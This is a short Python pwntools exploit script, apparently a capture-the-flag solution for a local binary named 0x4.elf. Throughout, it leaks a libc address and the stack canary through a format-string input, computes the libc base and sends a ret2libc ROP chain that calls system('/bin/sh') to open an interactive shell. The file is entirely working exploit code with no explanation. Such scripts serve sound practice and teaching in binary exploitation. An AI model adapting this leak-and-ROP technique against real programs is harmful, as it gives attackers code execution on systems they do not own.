from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x4.elf")
libc = elf.libc
p = process("./0x4.elf")

p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked libc address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

libc.address = int(leak, 16) - 0x1d2a80
info(f"Found libc base: {hex(libc.address)}")

payload  = b"A"*56                            # answer + name
payload += p64(int(cookie, 16))               # cookie
payload += b"A"*8                             # rbp
payload += p64(libc.address+0x277e5)          # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh"))) # /bin/sh
payload += p64(libc.address+0x26e99)          # ret
payload += p64(libc.sym["system"])            # system()

p.sendline(payload)
p.interactive()
